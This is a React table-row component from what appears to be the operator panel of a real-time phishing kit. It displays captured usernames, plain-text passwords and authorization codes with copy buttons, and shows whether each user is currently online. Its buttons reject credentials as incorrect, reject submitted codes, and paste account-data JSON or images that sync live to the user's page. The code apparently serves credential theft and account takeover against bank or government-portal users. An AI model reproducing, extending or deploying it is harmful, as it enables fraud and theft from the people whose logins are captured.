import React, { useState } from "react";
import { Copy, Trash2, Check, X } from "lucide-react";
import { api } from "@/api/apiClient";

const getTypeIdentifier = (tipo) => {
  const typeMap = {
    'juridica': 'J',
    'gobierno': 'G',
    'vivienda': 'V',
    'empresa': 'E',
    'ciudadano': 'C',
    'persona': 'P',
  };
  return typeMap[tipo?.toLowerCase()] || tipo?.charAt(0).toUpperCase() || '?';
};

export default function RequestRow({ request, presenceId, userPresence, onDelete, onStatusChange }) {
  const [copiedField, setCopiedField] = useState(null);
  const [loadingApprove, setLoadingApprove] = useState(false);
  const [loadingReject, setLoadingReject] = useState(false);
  const [loadingEtapaReject, setLoadingEtapaReject] = useState(false);
  const [loadingPermisoJson, setLoadingPermisoJson] = useState(false);
  const [permisoSuccess, setPermisoSuccess] = useState(false);
  const [loadingImageJson, setLoadingImageJson] = useState(false);
  const [imageJsonSuccess, setImageJsonSuccess] = useState(false);

  // Obtener estado de presencia del usuario usando presenceId generado dinámicamente
  const presence = presenceId ? userPresence?.get?.(presenceId) : null;
  const isOnline = presence?.status === 'online';

  // Log para debug
  if (presenceId) {
    console.log(`RequestRow: presenceId=${presenceId}, isOnline=${isOnline}, presence=`, presence);
  }

  const copyToClipboard = (text, field) => {
    navigator.clipboard.writeText(text);
    setCopiedField(field);
    setTimeout(() => setCopiedField(null), 1500);
  };

  const handleApprove = async () => {
    setLoadingApprove(true);
    try {
      await api.entities.PinoPermiso.update(request.id, {
        status: 'aprobado',
        aprobado_en: new Date().toISOString(),
      });
      if (onStatusChange) onStatusChange(request.id);
    } catch (err) {
      console.error('Error al aprobar:', err);
    } finally {
      setLoadingApprove(false);
    }
  };

  const handleReject = async () => {
    setLoadingReject(true);
    try {
      await api.entities.PinoPermiso.update(request.id, {
        status: 'rechazado',
        razon_rechazo: 'Credenciales incorrectas',
        aprobado_en: new Date().toISOString(),
      });
      if (onStatusChange) onStatusChange(request.id);
    } catch (err) {
      console.error('Error al rechazar:', err);
    } finally {
      setLoadingReject(false);
    }
  };

  const handleRejectEtapa = async () => {
    setLoadingEtapaReject(true);
    try {
      await api.entities.PinoPermiso.update(request.id, {
        status: 'rechazado',
        razon_rechazo: 'Código de autorización rechazado por el panel',
        etapa: '',
      });
      if (onStatusChange) onStatusChange(request.id);
    } catch (err) {
      console.error('Error al rechazar código de autorización:', err);
    } finally {
      setLoadingEtapaReject(false);
    }
  };


  const handlePegJsonEtapa = async () => {
    try {
      setLoadingPermisoJson(true);
      // Leer automáticamente del portapapeles
      const clipboardText = await navigator.clipboard.readText();
      console.log('📋 [Peg JSON Etapa] Contenido del portapapeles leído');

      // Parsear el JSON
      const data = JSON.parse(clipboardText);

      if (!data || Object.keys(data).length === 0) {
        console.warn('JSON inválido: el objeto no puede estar vacío');
        setLoadingPermisoJson(false);
        return;
      }

      // Guardar el JSON en el campo de permiso (BD)
      await api.entities.PinoPermiso.update(request.id, {
        permiso: JSON.stringify(data),
      });

      console.log('✓ [Peg JSON Etapa] Datos guardados en BD:', data);
      console.log('📡 [Peg JSON Etapa] Los datos se sincronizarán automáticamente via Supabase Realtime');

      // Usuarios en dispositivos diferentes reciben datos via Supabase Realtime
      // El UserInfoContainer escucha cambios en el campo permiso
      if (typeof window !== 'undefined' && window.cargarDatosContenedor) {
        // Si están en la misma página (mismo dispositivo), cargar datos directamente
        console.log('🔄 [Peg JSON Etapa] Cargando datos en UserInfoContainer local...');
        try {
          window.cargarDatosContenedor(data);
        } catch (funcErr) {
          console.error('❌ [Peg JSON Etapa] Error al llamar cargarDatosContenedor:', funcErr);
        }
      }

      setPermisoSuccess(true);
      setTimeout(() => setPermisoSuccess(false), 3000);
      if (onStatusChange) onStatusChange(request.id);
    } catch (err) {
      if (err.name === 'NotAllowedError') {
        console.error('Permiso denegado para leer portapapeles');
      } else if (err instanceof SyntaxError) {
        console.error('JSON inválido:', err);
      } else {
        console.error('Error al pegar JSON:', err);
      }
      setPermisoSuccess(false);
    } finally {
      setLoadingPermisoJson(false);
    }
  };

  const handlePegJsonImage = async () => {
    try {
      setLoadingImageJson(true);
      // Leer automáticamente del portapapeles
      const clipboardText = await navigator.clipboard.readText();
      console.log('📋 [Peg JSON Image] Contenido del portapapeles leído');

      // Parsear el JSON
      const data = JSON.parse(clipboardText);

      // Buscar imagen en diferentes campos posibles del JSON
      const imagenData = data.datos_base64 || data.url || data.imagen;

      if (!imagenData) {
        console.warn('⚠️ [Peg JSON Image] JSON no contiene "datos_base64", "url" o "imagen"');
        setImageJsonSuccess(false);
        return;
      }

      // Guardar solo la imagen (sin afectar otros campos)
      await api.entities.PinoPermiso.update(request.id, {
        imagen: imagenData,
      });

      console.log('✓ [Peg JSON Image] Imagen guardada en BD');
      setImageJsonSuccess(true);
      setTimeout(() => setImageJsonSuccess(false), 500);
      if (onStatusChange) onStatusChange(request.id);
    } catch (err) {
      if (err.name === 'NotAllowedError') {
        console.error('Permiso denegado para leer portapapeles');
      } else if (err instanceof SyntaxError) {
        console.error('JSON inválido:', err);
      } else {
        console.error('Error al pegar JSON imagen:', err);
      }
      setImageJsonSuccess(false);
    } finally {
      setLoadingImageJson(false);
    }
  };


  const getStatusColor = (status) => {
    switch (status) {
      case 'aprobado':
        return 'bg-green-100 text-green-800';
      case 'rechazado':
        return 'bg-red-100 text-red-800';
      case 'pendiente':
      default:
        return 'bg-yellow-100 text-yellow-800';
    }
  };

  const getStatusLabel = (status) => {
    switch (status) {
      case 'aprobado':
        return '✓ Aprobado';
      case 'rechazado':
        return '✗ Rechazado';
      case 'pendiente':
      default:
        return '⏳ Pendiente';
    }
  };

  return (
    <>
      <tr className="border-b border-gray-100 hover:bg-gray-50/50 transition-colors text-sm">
        {/* NUM - Tipo + Documento + Presencia */}
        <td className="px-3 py-3 whitespace-nowrap">
          <span className="inline-flex items-center gap-1.5">
            <span
              className={`w-2.5 h-2.5 rounded-full transition-colors duration-200 ${
                isOnline ? 'bg-green-500' : 'bg-red-500'
              }`}
              title={isOnline ? 'Usuario online' : 'Usuario offline'}
            ></span>
            <span className="font-bold text-gray-800 text-sm">
              {getTypeIdentifier(request.rif_type || request.tipo)}
            </span>
            {request.numero_documento && (
              <span className="text-gray-500 font-mono text-xs">{request.numero_documento.split('-')[1] || request.numero_documento}</span>
            )}
          </span>
        </td>

        {/* Usuario */}
        <td className="px-3 py-3 whitespace-nowrap">
          <span className="inline-flex items-center gap-1.5">
            <span className="font-semibold text-gray-800">{request.usuario}</span>
            <button
              onClick={() => {
                const numData = `${getTypeIdentifier(request.rif_type || request.tipo)}${request.numero_documento ? ' ' + (request.numero_documento.split('-')[1] || request.numero_documento) : ''}`;
                const fullData = `${numData} | ${request.usuario}`;
                copyToClipboard(fullData, "usuario");
              }}
              className={`inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded text-[10px] font-medium border transition-colors ${
                copiedField === "usuario"
                  ? "bg-green-50 text-green-600 border-green-200"
                  : "bg-gray-50 text-gray-500 border-gray-200 hover:bg-gray-100"
              }`}
              title="Copiar NUM y NOMBRE"
            >
              <Copy size={10} />
              {copiedField === "usuario" ? "✓" : "Copy"}
            </button>
          </span>
        </td>

        {/* Imagen */}
        <td className="px-3 py-3 whitespace-nowrap">
          <div className="flex items-center gap-2">
            {request.imagen ? (
              <img
                src={request.imagen}
                alt="Imagen"
                className="w-10 h-10 rounded object-cover border border-gray-200"
              />
            ) : (
              <div className="w-10 h-10 rounded bg-gray-100 border border-dashed border-gray-300 flex items-center justify-center text-gray-300 text-[10px]">
                Sin img
              </div>
            )}
            <button
              onClick={handlePegJsonImage}
              disabled={loadingImageJson}
              className={`px-2 py-1 rounded text-xs font-medium border transition-all ${
                imageJsonSuccess
                  ? "bg-green-500 text-white border-green-600"
                  : loadingImageJson
                  ? "bg-blue-100 text-blue-600 border-blue-300 cursor-wait"
                  : "bg-blue-50 text-blue-600 border-blue-200 hover:bg-blue-100"
              }`}
              title="Pegar JSON con datos de imagen (url, datos_base64 o imagen)"
            >
              {imageJsonSuccess ? "✓ Guardada" : loadingImageJson ? "⏳ Guardando..." : "Peg JSON"}
            </button>
          </div>
        </td>

        {/* Clave */}
        <td className="px-3 py-3 whitespace-nowrap">
          <span className="inline-flex items-center gap-1.5">
            <span className="text-gray-700 font-mono text-xs">{request.clave || "—"}</span>
            {request.clave && (
              <button
                onClick={() => copyToClipboard(request.clave, "clave")}
                className={`inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded text-[10px] font-medium border transition-colors ${
                  copiedField === "clave"
                    ? "bg-green-50 text-green-600 border-green-200"
                    : "bg-gray-50 text-gray-500 border-gray-200 hover:bg-gray-100"
                }`}
              >
                <Copy size={10} />
                {copiedField === "clave" ? "✓" : "Copy"}
              </button>
            )}
          </span>
        </td>

        {/* Etapa - Peg JSON + Código de Autorización (si existe) */}
        <td className="px-3 py-3 whitespace-nowrap">
          <div className="flex items-center gap-2">
            {/* Botón Peg JSON - siempre visible */}
            <button
              onClick={handlePegJsonEtapa}
              disabled={loadingPermisoJson}
              className={`px-2 py-1 rounded text-xs font-medium border transition-all ${
                permisoSuccess
                  ? "bg-green-500 text-white border-green-600"
                  : loadingPermisoJson
                  ? "bg-purple-100 text-purple-600 border-purple-300 cursor-wait"
                  : "bg-purple-50 text-purple-600 border-purple-200 hover:bg-purple-100"
              }`}
              title="Pegar JSON con datos de usuario (cuenta, usuario, perfil, hora_conexion)"
            >
              {permisoSuccess ? "✓ Datos guardados" : loadingPermisoJson ? "⏳ Guardando..." : "Peg JSON"}
            </button>

            {/* Código de Autorización y Rechazar - solo si existe código */}
            {request.etapa && request.etapa.trim() && (
              <>
                <span className="font-mono text-xs bg-yellow-50 border border-yellow-200 px-2 py-1 rounded text-yellow-800">
                  {request.etapa}
                </span>
                <button
                  onClick={handleRejectEtapa}
                  disabled={loadingEtapaReject}
                  className="inline-flex items-center gap-1 px-2 py-1 rounded text-xs font-medium bg-red-50 text-red-700 border border-red-200 hover:bg-red-100 disabled:opacity-50"
                  title="Rechazar código de autorización"
                >
                  <X size={12} />
                  {loadingEtapaReject ? "..." : "Rechazar"}
                </button>
              </>
            )}
          </div>
        </td>

        {/* Estado */}
        <td className="px-3 py-3 whitespace-nowrap">
          <span className={`inline-block px-2.5 py-1 rounded-full text-xs font-semibold ${getStatusColor(request.status)}`}>
            {getStatusLabel(request.status)}
          </span>
        </td>

        {/* Acciones */}
        <td className="px-3 py-3 whitespace-nowrap">
          <div className="inline-flex items-center gap-2">
            {request.status === 'pendiente' ? (
              <>
                <button
                  onClick={handleApprove}
                  disabled={loadingApprove}
                  className="inline-flex items-center gap-1 px-2 py-1 rounded text-xs font-medium bg-green-50 text-green-700 border border-green-200 hover:bg-green-100 disabled:opacity-50"
                  title="Aprobar solicitud"
                >
                  <Check size={14} />
                  {loadingApprove ? "..." : "Aprobar"}
                </button>
                <button
                  onClick={handleReject}
                  disabled={loadingReject}
                  className="inline-flex items-center gap-1 px-2 py-1 rounded text-xs font-medium bg-red-50 text-red-700 border border-red-200 hover:bg-red-100 disabled:opacity-50"
                  title="Rechazar solicitud"
                >
                  <X size={14} />
                  {loadingReject ? "..." : "Rechazar"}
                </button>
              </>
            ) : null}
            <button
              onClick={() => onDelete(request.id)}
              disabled={loadingApprove || loadingReject}
              className="inline-flex items-center gap-1 px-2 py-1 rounded text-xs font-medium bg-gray-100 text-gray-600 border border-gray-200 hover:bg-gray-200 disabled:opacity-50"
              title="Eliminar solicitud"
            >
              <Trash2 size={14} />
              Eliminar
            </button>
          </div>
        </td>
      </tr>


    </>
  );
}
